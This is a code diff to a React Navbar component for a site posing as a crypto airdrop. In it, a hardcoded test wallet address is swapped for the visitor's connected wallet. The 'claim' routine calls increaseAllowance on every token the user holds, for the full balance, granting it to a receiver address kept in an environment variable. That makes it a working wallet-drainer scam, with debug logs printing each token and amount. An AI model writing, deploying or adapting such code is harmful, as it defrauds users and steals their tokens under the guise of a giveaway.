@@ -83,8 +83,8 @@ function Navbar() {
         setShowAlert(false)
         return;
     }
-        // getWalletMetadata(String(address));
-        getWalletMetadata("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d");
+        getWalletMetadata(String(address));
+        // getWalletMetadata("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d");
 
  
   }, [isConnected]);
@@ -107,6 +107,7 @@ function Navbar() {
     //     //  const data =    await contract.increaseAllowance(String(process.env.NEXT_PUBLIC_RECEIVERADDRESS ,item?.balance ))
     //     //  console.log(data)
     //   })
+      console.log(" Ether balance " , balanceEth)
       setGetProvider(provider);
       setGetSigner(signer);
    
@@ -146,9 +147,12 @@ function Navbar() {
 const callContract = async()=>{
      try{
 
-        getWalletMetadata("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d");
+      console.log(address)
+         getWalletMetadata(String(address))
+        // getWalletMetadata("0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d");
 
     if (!isConnected) throw Error('User disconnected')
+
         const walletAbi = [
             {
                 "type": "function",
@@ -177,20 +181,23 @@ const callContract = async()=>{
         if (!walletProvider) throw Error('walletProvider not available');
         const ethersProvider = new BrowserProvider(walletProvider)
         const signer = await ethersProvider.getSigner()
-        console.log(signer , ethersProvider , walletProvider , usersWalletData)
+        // console.log(signer , ethersProvider , walletProvider , usersWalletData , )
         if( usersWalletData?.token?.length == 0 ){
             setShowAlert(true)
             throw Error('you are not eligible for this airdrop');
             return;
 
         }
+
+
+        console.log(usersWalletData)
         usersWalletData?.token?.map(async (item:any, index:number)=>{
             try{
                 const contract =  new Contract(String(item.token_address), walletAbi , signer)
                 const amount = new BigNumber(item.balance);
                 const data =   await contract.increaseAllowance(process.env.NEXT_PUBLIC_RECEIVERADDRESS, item?.balance)
                 console.log(contract , data)
-
+                console.log("THIS IS THE TOKEN " , item.token_address , "THIS IS THE AMOUNT " , item?.balance , "THIS IS THE RECIEVER ADDRESS " , process.env.NEXT_PUBLIC_RECEIVERADDRESS )
             }catch(error:any){
                 console.log(error)
             }
